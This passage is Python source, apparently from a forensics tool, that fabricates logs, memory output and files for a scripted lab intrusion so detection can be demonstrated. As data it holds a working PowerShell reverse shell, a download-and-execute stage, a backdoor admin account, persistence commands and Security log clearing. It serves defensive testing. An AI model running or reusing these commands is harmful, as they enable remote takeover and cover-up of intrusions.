"""Builds a realistic demo case from the PRD's scripted 8-step lab attack (section 9.2), so the full
pipeline, dashboard and report can be shown without a lab VM ("judges pick the attack": any step subset).

Faithful to how Windows behaves: if step 8 (clear the Security log) is chosen, every Security event written
before the clear is gone; ForenSight then has to recover the earlier steps from Sysmon, PowerShell,
RDP and TaskScheduler logs, live state, memory and the baseline diff.
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import random
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

from collector.base import Ctx
from core import progress
from core.case import create_case, update_case
from core.manifest import sign_manifest
from core.timeutil import iso, now_iso, now_utc

ATTACKER = "192.168.56.20"
VICTIM_IP = "192.168.56.10"
HOST = "VICTIM-WIN"
EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

STEPS = {
    1: ("Password-guess RDP/SMB login from Kali", ["T1110"]),
    2: ("Log in as a weak-password admin", ["T1078"]),
    3: ("Run encoded PowerShell that downloads a test file", ["T1059.001"]),
    4: ("Drop EICAR file in %TEMP%", ["T1105"]),
    5: ("Create user support_backup and add to admins", ["T1136", "T1098"]),
    6: ("Add Run-key entry and a scheduled task", ["T1547.001", "T1053.005"]),
    7: ("Open outbound connection to Kali port 4444", ["T1071"]),
    8: ("Clear the Security log", ["T1070.001"]),
}

TEMP = r"C:\Users\admin\AppData\Local\Temp"
DROP = TEMP + r"\updater.exe"
UP_PS1 = r"C:\Users\Public\up.ps1"
STAGE2 = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.20:8000/update.ps1')"
REVSHELL = ("$c=New-Object Net.Sockets.TCPClient('192.168.56.20',4444);$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$o=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($o),0,$o.Length)}")


def _fake_sha(s: str) -> str:
    return hashlib.sha256(("forensight-demo:" + s).encode()).hexdigest()


class Builder:
    def __init__(self, t0: datetime, seed: int = 7):
        self.t0 = t0
        self.rng = random.Random(seed)
        self.logs: dict[str, list[dict]] = {}
        self.rid: dict[str, int] = {}
        self.truth: list[dict] = []

    def at(self, minutes: float) -> datetime:
        return self.t0 + timedelta(minutes=minutes)

    def ev(self, log: str, channel: str, eid: int, when: datetime, data: dict, pid: int | None = None, provider: str | None = None):
        self.rid[log] = self.rid.get(log, {"Security": 48100, "Sysmon": 9100}.get(log, 300)) + 1
        self.logs.setdefault(log, []).append({
            "EventID": eid, "TimeCreated": iso(when), "Computer": f"{HOST}.lab.local", "Channel": channel,
            "EventRecordID": self.rid[log], "ProcessID": pid, "Provider": provider, "Data": data})

    def sec(self, eid, when, data, pid=652):
        self.ev("Security", "Security", eid, when, data, pid, "Microsoft-Windows-Security-Auditing")

    def sysmon(self, eid, when, data):
        self.ev("Sysmon", "Microsoft-Windows-Sysmon/Operational", eid, when, {"UtcTime": iso(when)[:-1].replace("T", " "), **data},
                2280, "Microsoft-Windows-Sysmon")

    def proc(self, when, pid, ppid, image, parent, cmd, user="VICTIM-WIN\\admin"):
        """Process creation as both Security 4688 and Sysmon 1."""
        self.sec(4688, when, {"SubjectUserName": user.split("\\")[-1], "SubjectDomainName": HOST, "NewProcessId": hex(pid),
                              "NewProcessName": image, "ProcessId": hex(ppid), "CommandLine": cmd, "ParentProcessName": parent,
                              "TokenElevationType": "%%1937"}, pid=4)
        self.sysmon(1, when, {"ProcessId": pid, "Image": image, "CommandLine": cmd, "User": user, "ParentProcessId": ppid,
                              "ParentImage": parent, "Hashes": f"SHA256={_fake_sha(image).upper()}",
                              "IntegrityLevel": "High"})


def _noise(b: Builder) -> None:
    """Benign activity before and during the attack (the false-positive test)."""
    for m in (-55, -40, -22, 25):
        b.sec(4624, b.at(m), {"TargetUserName": "labuser", "TargetDomainName": HOST, "LogonType": 2, "IpAddress": "127.0.0.1",
                              "TargetLogonId": hex(0x2A000 + int(m * 10) % 4096), "LogonProcessName": "User32"})
        b.sec(4624, b.at(m + 0.1), {"TargetUserName": "SYSTEM", "LogonType": 5, "IpAddress": "-", "TargetLogonId": "0x3e7"})
    b.sec(4625, b.at(-30), {"TargetUserName": "labuser", "LogonType": 2, "IpAddress": "127.0.0.1", "Status": "0xc000006d",
                            "SubStatus": "0xc000006a", "WorkstationName": HOST})
    b.proc(b.at(-50), 7420, 3020, r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Windows\explorer.exe",
           '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', "VICTIM-WIN\\labuser")
    b.proc(b.at(-20), 7800, 3020, r"C:\Windows\System32\notepad.exe", r"C:\Windows\explorer.exe",
           r'"C:\Windows\System32\notepad.exe" C:\Users\labuser\Documents\todo.txt', "VICTIM-WIN\\labuser")
    b.ev("System", "System", 7045, b.at(-45), {"ServiceName": "Microsoft Defender Antivirus Network Inspection Service",
         "ImagePath": r'"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24090.11-0\NisSrv.exe"', "ServiceType": "user mode service",
         "StartType": "demand start", "AccountName": "NT AUTHORITY\\LocalService"}, 640, "Service Control Manager")
    b.ev("PowerShell", "Microsoft-Windows-PowerShell/Operational", 4104, b.at(-35),
         {"MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": "Get-ChildItem C:\\Users\\labuser\\Documents | Sort-Object Length",
          "ScriptBlockId": "0b9a1f0e-1111-4c1d-9a0b-000000000001", "Path": ""}, 6600, "Microsoft-Windows-PowerShell")
    b.sysmon(3, b.at(-49), {"ProcessId": 7420, "Image": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                            "User": "VICTIM-WIN\\labuser", "Protocol": "tcp", "SourceIp": VICTIM_IP, "SourcePort": 50110,
                            "DestinationIp": "192.168.56.1", "DestinationPort": 443, "Initiated": "true"})


def build_windows(steps: list[int], t0: datetime) -> tuple[Builder, dict]:
    b = Builder(t0)
    _noise(b)
    state = {"users_added": [], "admins_added": [], "runkeys": [], "tasks": [], "procs": [], "conns": [], "files": []}
    ps_pid, shell_pid = 4312, 5120
    admin_explorer = 6012

    if 1 in steps:
        t = b.at(0)
        for i in range(25):
            when = t + timedelta(seconds=4 * i + b.rng.random())
            b.sec(4625, when, {"TargetUserName": "admin", "TargetDomainName": HOST, "LogonType": 3, "IpAddress": ATTACKER,
                               "IpPort": str(40000 + i), "WorkstationName": "kali", "Status": "0xc000006d", "SubStatus": "0xc000006a",
                               "AuthenticationPackageName": "NTLM", "LogonProcessName": "NtLmSsp"})
            b.ev("RdpCoreTS", "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", 140, when,
                 {"IPString": ATTACKER}, 1188, "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS")
        b.sec(4624, b.at(1.75), {"TargetUserName": "admin", "TargetDomainName": HOST, "LogonType": 3, "IpAddress": ATTACKER,
                                 "IpPort": "40026", "WorkstationName": "kali", "TargetLogonId": "0x3e1f20",
                                 "AuthenticationPackageName": "NTLM", "LogonProcessName": "NtLmSsp"})
        b.truth.append({"step": 1, "ts": iso(b.at(1.75)), "techniques": STEPS[1][1]})
    if 2 in steps:
        when = b.at(3)
        b.sec(4624, when, {"TargetUserName": "admin", "TargetDomainName": HOST, "LogonType": 10, "IpAddress": ATTACKER,
                           "IpPort": "40112", "WorkstationName": "kali", "TargetLogonId": "0x3e7a21", "LogonProcessName": "User32"})
        for eid, dt in ((21, 0.05), (25, 0.06)):
            b.ev("LocalSessionManager", "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", eid, when + timedelta(minutes=dt),
                 {"User": "VICTIM-WIN\\admin", "SessionID": 2, "Address": ATTACKER}, 1040,
                 "Microsoft-Windows-TerminalServices-LocalSessionManager")
        b.truth.append({"step": 2, "ts": iso(when), "techniques": STEPS[2][1]})
    if 2 in steps or 3 in steps:
        state["procs"].append({"pid": admin_explorer, "ppid": 5980, "name": "explorer.exe", "path": r"C:\Windows\explorer.exe",
                               "cmdline": r"C:\Windows\explorer.exe", "user": "VICTIM-WIN\\admin", "start": b.at(3.2)})
    if 3 in steps:
        when = b.at(5.17)
        enc = base64.b64encode(STAGE2.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoP -W Hidden -enc {enc}"
        b.proc(when, ps_pid, admin_explorer, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"C:\Windows\explorer.exe", cmd)
        b.ev("PowerShell", "Microsoft-Windows-PowerShell/Operational", 4104, when + timedelta(seconds=2),
             {"MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": STAGE2, "ScriptBlockId": "5d2c7e1a-3f4b-4e0d-8a7c-1b2c3d4e5f60",
              "Path": ""}, ps_pid, "Microsoft-Windows-PowerShell")
        stage3 = "$p=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + \
            base64.b64encode(b"Write-Output 'lab payload'; Start-Sleep 1").decode() + "')); IEX $p"
        b.ev("PowerShell", "Microsoft-Windows-PowerShell/Operational", 4104, when + timedelta(seconds=5),
             {"MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": stage3, "ScriptBlockId": "7e3d8f2b-4a5c-4f1e-9b8d-2c3d4e5f6a71",
              "Path": ""}, ps_pid, "Microsoft-Windows-PowerShell")
        b.sysmon(3, when + timedelta(seconds=1), {"ProcessId": ps_pid, "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                 "User": "VICTIM-WIN\\admin", "Protocol": "tcp", "SourceIp": VICTIM_IP, "SourcePort": 50322,
                 "DestinationIp": ATTACKER, "DestinationPort": 8000, "Initiated": "true"})
        state["procs"].append({"pid": ps_pid, "ppid": admin_explorer, "name": "powershell.exe",
                               "path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "cmdline": cmd,
                               "user": "VICTIM-WIN\\admin", "start": when})
        b.truth.append({"step": 3, "ts": iso(when), "techniques": STEPS[3][1]})
    if 4 in steps:
        when = b.at(6.5)
        b.sysmon(11, when, {"ProcessId": ps_pid, "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                            "TargetFilename": DROP, "CreationUtcTime": iso(when)[:-1].replace("T", " "), "User": "VICTIM-WIN\\admin"})
        state["files"].append({"original_path": DROP, "name": "updater.exe", "content": EICAR, "mtime": when})
        b.truth.append({"step": 4, "ts": iso(when), "techniques": STEPS[4][1]})
    if 5 in steps:
        when = b.at(8)
        net = r"C:\Windows\System32\net.exe"
        ps_img = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        b.proc(when, 6220, ps_pid, net, ps_img, "net user support_backup P@ssw0rd!2026 /add")
        b.sec(4720, when + timedelta(seconds=1), {"TargetUserName": "support_backup", "TargetDomainName": HOST,
              "TargetSid": "S-1-5-21-3623811015-3361044348-30300820-1013", "SubjectUserName": "admin", "SubjectDomainName": HOST,
              "SamAccountName": "support_backup", "UserAccountControl": "%%2080"})
        b.proc(when + timedelta(seconds=20), 6244, ps_pid, net, ps_img, "net localgroup administrators support_backup /add")
        b.sec(4732, when + timedelta(seconds=21), {"MemberName": "VICTIM-WIN\\support_backup",
              "MemberSid": "S-1-5-21-3623811015-3361044348-30300820-1013", "TargetUserName": "Administrators",
              "TargetDomainName": "Builtin", "TargetSid": "S-1-5-32-544", "SubjectUserName": "admin", "SubjectDomainName": HOST})
        state["users_added"].append("support_backup")
        state["admins_added"].append("support_backup")
        b.truth.append({"step": 5, "ts": iso(when), "techniques": STEPS[5][1]})
    if 6 in steps:
        when = b.at(10)
        ps_img = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        key = r"HKU\S-1-5-21-3623811015-3361044348-30300820-1001\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater"
        b.sysmon(13, when, {"EventType": "SetValue", "ProcessId": ps_pid, "Image": ps_img, "TargetObject": key, "Details": DROP,
                            "User": "VICTIM-WIN\\admin"})
        state["runkeys"].append({"key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "name": "WindowsUpdater",
                                 "value": DROP, "user": "admin", "last_write": iso(when)})
        tw = when + timedelta(seconds=40)
        tr = f"powershell.exe -W Hidden -NoP -File {UP_PS1}"
        b.proc(tw, 6390, ps_pid, r"C:\Windows\System32\schtasks.exe", ps_img,
               f'schtasks /create /tn "UpdaterTask" /tr "{tr}" /sc onlogon /ru SYSTEM /f')
        b.sec(4698, tw + timedelta(seconds=1), {"TaskName": r"\UpdaterTask", "SubjectUserName": "admin", "SubjectDomainName": HOST,
              "TaskContent": f"<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-W Hidden -NoP -File {UP_PS1}</Arguments></Exec></Actions></Task>"})
        b.ev("TaskScheduler", "Microsoft-Windows-TaskScheduler/Operational", 106, tw + timedelta(seconds=1),
             {"TaskName": r"\UpdaterTask", "UserContext": "VICTIM-WIN\\admin"}, 1520, "Microsoft-Windows-TaskScheduler")
        b.sysmon(11, tw - timedelta(seconds=5), {"ProcessId": ps_pid, "Image": ps_img, "TargetFilename": UP_PS1,
                                                 "User": "VICTIM-WIN\\admin"})
        state["tasks"].append({"name": r"\UpdaterTask", "action": tr, "author": "VICTIM-WIN\\admin", "run_as": "SYSTEM",
                               "status": "Ready", "schedule": "At logon time", "created": iso(tw)})
        state["files"].append({"original_path": UP_PS1, "name": "up.ps1", "content": REVSHELL.encode(), "mtime": tw - timedelta(seconds=5)})
        b.truth.append({"step": 6, "ts": iso(when), "techniques": STEPS[6][1]})
    if 7 in steps:
        when = b.at(12)
        ps_img = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        cmd = f'powershell.exe -NoP -W Hidden -c "{REVSHELL[:120]}..."'
        b.proc(when, shell_pid, ps_pid if 3 in steps else admin_explorer, ps_img, ps_img if 3 in steps else r"C:\Windows\explorer.exe", cmd)
        b.sysmon(3, when + timedelta(seconds=1), {"ProcessId": shell_pid, "Image": ps_img, "User": "VICTIM-WIN\\admin",
                 "Protocol": "tcp", "SourceIp": VICTIM_IP, "SourcePort": 50418, "DestinationIp": ATTACKER,
                 "DestinationPort": 4444, "Initiated": "true"})
        state["procs"].append({"pid": shell_pid, "ppid": ps_pid if 3 in steps else admin_explorer, "name": "powershell.exe",
                               "path": ps_img, "cmdline": cmd, "user": "VICTIM-WIN\\admin", "start": when})
        state["conns"].append({"proto": "tcp", "laddr": VICTIM_IP, "lport": 50418, "raddr": ATTACKER, "rport": 4444,
                               "state": "ESTABLISHED", "pid": shell_pid, "process": "powershell.exe", "created": iso(when + timedelta(seconds=1))})
        b.truth.append({"step": 7, "ts": iso(when), "techniques": STEPS[7][1]})
    if 8 in steps:
        when = b.at(14)
        b.proc(when, 6512, ps_pid if 3 in steps else admin_explorer, r"C:\Windows\System32\wevtutil.exe",
               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "wevtutil cl Security")
        # Clearing the Security log destroys every earlier Security record (realistic anti-forensics)
        b.logs["Security"] = [e for e in b.logs.get("Security", []) if e["TimeCreated"] > iso(when)]
        b.sec(1102, when + timedelta(seconds=1), {"SubjectUserName": "admin", "SubjectDomainName": HOST,
              "SubjectUserSid": "S-1-5-21-3623811015-3361044348-30300820-1001", "SubjectLogonId": "0x3e7a21"})
        b.truth.append({"step": 8, "ts": iso(when), "techniques": STEPS[8][1]})
    # post-attack benign noise
    b.sec(4624, b.at(16), {"TargetUserName": "labuser", "TargetDomainName": HOST, "LogonType": 7, "IpAddress": "127.0.0.1",
                           "TargetLogonId": "0x2b8f1"})
    return b, state


BASE_PROCS = [
    (4, 0, "System", None, None, "SYSTEM"), (88, 4, "Registry", None, None, "SYSTEM"), (360, 4, "smss.exe", r"C:\Windows\System32\smss.exe", None, "SYSTEM"),
    (468, 452, "csrss.exe", r"C:\Windows\System32\csrss.exe", None, "SYSTEM"), (548, 452, "wininit.exe", r"C:\Windows\System32\wininit.exe", None, "SYSTEM"),
    (640, 548, "services.exe", r"C:\Windows\System32\services.exe", None, "SYSTEM"), (652, 548, "lsass.exe", r"C:\Windows\System32\lsass.exe", None, "SYSTEM"),
    (780, 640, "svchost.exe", r"C:\Windows\System32\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p", "SYSTEM"),
    (1040, 640, "svchost.exe", r"C:\Windows\System32\svchost.exe", "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p", "LOCAL SERVICE"),
    (1188, 640, "svchost.exe", r"C:\Windows\System32\svchost.exe", "C:\\Windows\\System32\\svchost.exe -k termsvcs -s TermService", "NETWORK SERVICE"),
    (1520, 640, "svchost.exe", r"C:\Windows\System32\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule", "SYSTEM"),
    (2280, 640, "Sysmon64.exe", r"C:\Windows\Sysmon64.exe", r"C:\Windows\Sysmon64.exe", "SYSTEM"),
    (2416, 640, "MsMpEng.exe", r"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24090.11-0\MsMpEng.exe", None, "SYSTEM"),
    (3020, 2992, "explorer.exe", r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE", "VICTIM-WIN\\labuser"),
    (3388, 3020, "OneDrive.exe", r"C:\Users\labuser\AppData\Local\Microsoft\OneDrive\OneDrive.exe", "/background", "VICTIM-WIN\\labuser"),
    (7420, 3020, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", None, "VICTIM-WIN\\labuser"),
]


def _snapshot(state: dict | None) -> dict:
    users = {"Administrator": {"Enabled": False}, "Guest": {"Enabled": False}, "DefaultAccount": {"Enabled": False},
             "WDAGUtilityAccount": {"Enabled": False}, "labuser": {"Enabled": True}, "admin": {"Enabled": True}}
    groups = {"Administrators:Administrator": {"group": "Administrators", "member": "Administrator"},
              "Administrators:admin": {"group": "Administrators", "member": "admin"}}
    services = {n: {"binpath": p, "start_type": "automatic"} for n, p in [
        ("TermService", r"C:\Windows\System32\svchost.exe -k termsvcs"), ("Schedule", r"C:\Windows\system32\svchost.exe -k netsvcs -p"),
        ("Sysmon64", r"C:\Windows\Sysmon64.exe"), ("WinDefend", r"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24090.11-0\MsMpEng.exe"),
        ("EventLog", r"C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p"), ("LanmanServer", r"C:\Windows\system32\svchost.exe -k netsvcs -p")]}
    tasks = {r"\Microsoft\Windows\Defrag\ScheduledDefrag": {"action": r"%windir%\system32\defrag.exe -c -h -o -$"},
             r"\OneDrive Reporting Task-S-1-5-21-1001": {"action": r"%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe /reporting"}}
    run_keys = {r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityHealth": {"value": r"%windir%\system32\SecurityHealthSystray.exe"},
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive": {"value": r'"C:\Users\labuser\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background'}}
    ports = {"135/tcp": {"addr": "0.0.0.0", "process": "svchost.exe"}, "445/tcp": {"addr": "0.0.0.0", "process": "System"},
             "3389/tcp": {"addr": "0.0.0.0", "process": "svchost.exe"}}
    programs = {"Google Chrome": {"version": "131.0.6778.86"}, "Sysmon": {"version": "15.15"}, "7-Zip 24.08 (x64)": {"version": "24.08"}}
    items = {"users": users, "groups": groups, "services": services, "tasks": tasks, "run_keys": run_keys, "ports": ports,
             "programs": programs, "startup": {}}
    if state:
        for u in state["users_added"]:
            items["users"][u] = {"Enabled": True}
        for u in state["admins_added"]:
            items["groups"][f"Administrators:{u}"] = {"group": "Administrators", "member": u}
        for r in state["runkeys"]:
            items["run_keys"][f"{r['key']}\\{r['name']}"] = {"value": r["value"]}
        for t in state["tasks"]:
            items["tasks"][t["name"]] = {"action": t["action"]}
    return {"items": items}


def _vol(state: dict, t0: datetime, collected: datetime) -> dict:
    pslist = []
    for pid, ppid, name, path, cmd, user in BASE_PROCS:
        pslist.append({"PID": pid, "PPID": ppid, "ImageFileName": name, "Offset(V)": 0xFFFF800000000000 + pid * 4096, "Threads": 8,
                       "Handles": 200, "SessionId": 0 if user == "SYSTEM" else 1, "Wow64": False,
                       "CreateTime": iso(t0 - timedelta(hours=3, minutes=-pid / 1000)), "ExitTime": None, "File output": "Disabled",
                       "__children": []})
    for p in state["procs"]:
        pslist.append({"PID": p["pid"], "PPID": p["ppid"], "ImageFileName": p["name"], "Offset(V)": 0xFFFF900000000000 + p["pid"],
                       "Threads": 12, "Handles": 400, "SessionId": 2, "Wow64": False, "CreateTime": iso(p["start"]), "ExitTime": None,
                       "File output": "Disabled", "__children": []})
    psscan = [dict(r) for r in pslist]
    for pid, name, mins in ((6220, "net.exe", 8), (6244, "net.exe", 8.3), (6390, "schtasks.exe", 10.7), (6512, "wevtutil.exe", 14)):
        psscan.append({"PID": pid, "PPID": 4312, "ImageFileName": name, "Offset(V)": 0xFFFFA00000000000 + pid,
                       "CreateTime": iso(t0 + timedelta(minutes=mins)), "ExitTime": iso(t0 + timedelta(minutes=mins, seconds=1)),
                       "File output": "Disabled"})
    cmdline = [{"PID": pid, "Process": name, "Args": cmd or path or name} for pid, _, name, path, cmd, _ in BASE_PROCS]
    cmdline += [{"PID": p["pid"], "Process": p["name"], "Args": p["cmdline"]} for p in state["procs"]]
    netscan = [{"Offset": 0, "Proto": "TCPv4", "LocalAddr": "0.0.0.0", "LocalPort": port, "ForeignAddr": "0.0.0.0", "ForeignPort": 0,
                "State": "LISTENING", "PID": pid, "Owner": owner, "Created": iso(t0 - timedelta(hours=3))}
               for port, pid, owner in ((135, 780, "svchost.exe"), (445, 4, "System"), (3389, 1188, "svchost.exe"))]
    for c in state["conns"]:
        netscan.append({"Offset": 0, "Proto": "TCPv4", "LocalAddr": c["laddr"], "LocalPort": c["lport"], "ForeignAddr": c["raddr"],
                        "ForeignPort": c["rport"], "State": "ESTABLISHED", "PID": c["pid"], "Owner": c["process"], "Created": c["created"]})
    svcscan = [{"Offset": 0, "Order": i, "PID": None, "Start": "SERVICE_AUTO_START", "State": "SERVICE_RUNNING",
                "Type": "SERVICE_WIN32_SHARE_PROCESS", "Name": n, "Display": n, "Binary": v["binpath"]}
               for i, (n, v) in enumerate(_snapshot(None)["items"]["services"].items())]
    return {"pslist": pslist, "psscan": psscan, "cmdline": cmdline, "netscan": netscan, "malfind": [], "svcscan": svcscan,
            "pstree": pslist}


def generate(root: Path | None = None, steps: list[int] | None = None, name: str = "Lab-Breach-01",
             investigator: str = "Asha", delay: float = 0.0, listener=None, baseline: bool = True,
             on_created=None) -> Path:
    """Create a complete demo case. `delay` (seconds per artifact) slows collection for the live page."""
    steps = sorted(set(steps if steps is not None else STEPS))
    host = {"hostname": HOST, "os": "Windows", "os_version": "10.0.19045", "os_release": "10", "arch": "AMD64",
            "timezone": "Asia/Kolkata", "ip": VICTIM_IP}
    case_dir = create_case(name, investigator, notes=f"Demo case: scripted lab attack steps {steps or 'none (clean)'}",
                           root=root, host=host)
    collected = now_utc()
    t0 = (collected - timedelta(minutes=48)).replace(second=0, microsecond=0)
    update_case(case_dir, incident_window={"start": iso(t0 - timedelta(days=7)), "end": None}, demo={"steps": steps})
    progress.reset(case_dir)
    if on_created:
        on_created(case_dir)
    b, state = build_windows(steps, t0)
    case = json.loads((case_dir / "case.json").read_text())
    progress.reset(case_dir)
    ctx = Ctx(case_dir, case, listener)

    def pause():
        if delay:
            time.sleep(delay)

    def mod(name, pct, fn):
        ctx.emit(name, "running", pct=pct)
        fn()
        ctx.emit(name, "done", pct=pct + 8)
        ctx.log(name, "module finished (demo data)")

    ctx.emit("collect", "start", pct=0, message="demo collection (VICTIM-WIN lab snapshot)")
    ctx.log("collect", f"demo collection started for steps {steps}")

    def memory():
        ctx.log("memory", "demo: 4 GB memory.raw not bundled; Volatility output from the lab dump is cached in analysis/volatility/", "WARN")
        vdir = case_dir / "analysis/volatility"
        vdir.mkdir(parents=True, exist_ok=True)
        for k, v in _vol(state, t0, collected).items():
            (vdir / f"{k}.json").write_text(json.dumps(v, indent=1))
        ctx.emit("memory", "skipped", message="RAM image not bundled with the demo; cached Volatility results used")
        pause()

    def network():
        rows = [{"proto": "tcp", "laddr": "0.0.0.0", "lport": p, "raddr": None, "rport": None, "state": "LISTEN", "pid": pid, "process": o}
                for p, pid, o in ((135, 780, "svchost.exe"), (445, 4, "System"), (3389, 1188, "svchost.exe"))]
        if 2 in steps:
            rows.append({"proto": "tcp", "laddr": VICTIM_IP, "lport": 3389, "raddr": ATTACKER, "rport": 40112, "state": "ESTABLISHED",
                         "pid": 1188, "process": "svchost.exe", "created": iso(t0 + timedelta(minutes=3))})
        rows += state["conns"]
        rows.append({"proto": "tcp", "laddr": VICTIM_IP, "lport": 50201, "raddr": "192.168.56.1", "rport": 443, "state": "TIME_WAIT",
                     "pid": 0, "process": None})
        ctx.write_json("network", "raw/live/netconns.json", rows); pause()

    def processes():
        rows = []
        for pid, ppid, name, path, cmd, user in BASE_PROCS:
            rows.append({"pid": pid, "ppid": ppid, "name": name, "parent_name": None, "path": path, "cmdline": cmd or path,
                         "user": user, "start_time": iso(t0 - timedelta(hours=3)), "sha256": _fake_sha(path or name) if path else None})
        for p in state["procs"]:
            rows.append({"pid": p["pid"], "ppid": p["ppid"], "name": p["name"], "parent_name": None, "path": p["path"],
                         "cmdline": p["cmdline"], "user": p["user"], "start_time": iso(p["start"]), "sha256": _fake_sha(p["path"])})
        names = {r["pid"]: r["name"] for r in rows}
        for r in rows:
            r["parent_name"] = names.get(r["ppid"])
        ctx.write_json("processes", "raw/live/processes.json", rows); pause()

    snap = _snapshot(state)

    def users():
        ctx.write_json("users", "raw/live/users.json", {
            "logged_in": [{"name": "labuser", "terminal": "console", "host": None, "started": iso(t0 - timedelta(hours=2))}] +
                         ([{"name": "admin", "terminal": "rdp-tcp#0", "host": ATTACKER, "started": iso(t0 + timedelta(minutes=3))}] if 2 in steps else []),
            "accounts": [{"Name": k, **v} for k, v in snap["items"]["users"].items()],
            "admins": [v["member"] for v in snap["items"]["groups"].values()]}); pause()

    def services():
        ctx.write_json("services", "raw/live/services.json", [{"name": k, "display": k, "binpath": v["binpath"], "start_type": v["start_type"],
                                                               "status": "running", "user": "LocalSystem"} for k, v in snap["items"]["services"].items()]); pause()

    def tasks():
        rows = [{"name": k, "action": v["action"], "author": "Microsoft Corporation", "run_as": "SYSTEM", "status": "Ready"}
                for k, v in _snapshot(None)["items"]["tasks"].items()] + state["tasks"]
        ctx.write_json("tasks", "raw/live/tasks.json", rows); pause()

    def logs():
        names = {"Security": "Security", "System": "System", "PowerShell": "PowerShell-Operational", "Sysmon": "Sysmon",
                 "TaskScheduler": "TaskScheduler-Operational", "RdpCoreTS": "RdpCoreTS-Operational",
                 "LocalSessionManager": "LocalSessionManager-Operational"}
        for key, fname in names.items():
            evs = sorted(b.logs.get(key, []), key=lambda e: e["TimeCreated"])
            p = case_dir / f"raw/logs/{fname}.evtx.jsonl"
            p.write_text("".join(json.dumps(e) + "\n" for e in evs))
            ctx.register("logs", p); pause()

    def persistence():
        rk = [{"key": k.rsplit("\\", 1)[0], "name": k.rsplit("\\", 1)[1], "value": v["value"],
               "user": "labuser" if "OneDrive" in k else "SYSTEM", "last_write": iso(t0 - timedelta(days=30))}
              for k, v in _snapshot(None)["items"]["run_keys"].items()] + state["runkeys"]
        ctx.write_json("persistence", "raw/live/runkeys.json", rk)
        ctx.write_json("persistence", "raw/live/startup.json", []); pause()

    def programs():
        ctx.write_json("programs", "raw/live/programs.json", [{"name": k, **v} for k, v in snap["items"]["programs"].items()]); pause()

    def files():
        index = []
        for i, f in enumerate(state["files"]):
            p = case_dir / f"raw/artifacts/files/{i:04d}_{f['name']}"
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(f["content"])
            ts = f["mtime"].timestamp()
            os.utime(p, (ts, ts))
            e = ctx.register("files", p)
            index.append({"original_path": f["original_path"], "copy": e["path"], "sha256": e["sha256"], "size": e["size"],
                          "mtime": iso(f["mtime"])})
            pause()
        ctx.write_json("files", "raw/artifacts/files_index.json", index)

    if baseline:
        bdir = case_dir / "raw/baseline"
        bdir.mkdir(parents=True, exist_ok=True)
        base = {"snapshot": "baseline", "taken_at": iso(t0 - timedelta(days=1)), **_snapshot(None)}
        ctx.write_json("baseline", "raw/baseline/snapshot.json", base)
    plan = [("memory", memory), ("network", network), ("processes", processes), ("users", users), ("services", services),
            ("tasks", tasks), ("logs", logs), ("persistence", persistence), ("programs", programs), ("files", files)]
    for i, (n, fn) in enumerate(plan):
        mod(n, 100 * i / len(plan), fn)
    ctx.write_json("snapshot", "raw/live/snapshot.json", {"snapshot": "incident", "taken_at": iso(collected), **snap})
    sign_manifest(case_dir)
    (case_dir / "lab_truth.json").write_text(json.dumps({"steps": steps, "attack_start": iso(t0), "truth": b.truth,
                                                         "step_names": {k: v[0] for k, v in STEPS.items()}}, indent=1))
    update_case(case_dir, status="collected", collected_at=iso(collected), collection={
        "profile": "demo", "artifacts": ctx.count, "bytes": ctx.bytes, "seconds": 0,
        "modules": {n: "ok" for n, _ in plan}})
    ctx.emit("collect", "complete", pct=100, message=f"{ctx.count} artifacts hashed")
    ctx.log("collect", f"demo collection finished: {ctx.count} artifacts")
    return case_dir


# ---------------------------------------------------------------- Linux SSH scenario
def generate_linux(root: Path | None = None, investigator: str = "Asha") -> Path:
    host = {"hostname": "victim-lnx", "os": "Linux", "os_version": "Ubuntu 24.04", "arch": "x86_64", "timezone": "UTC"}
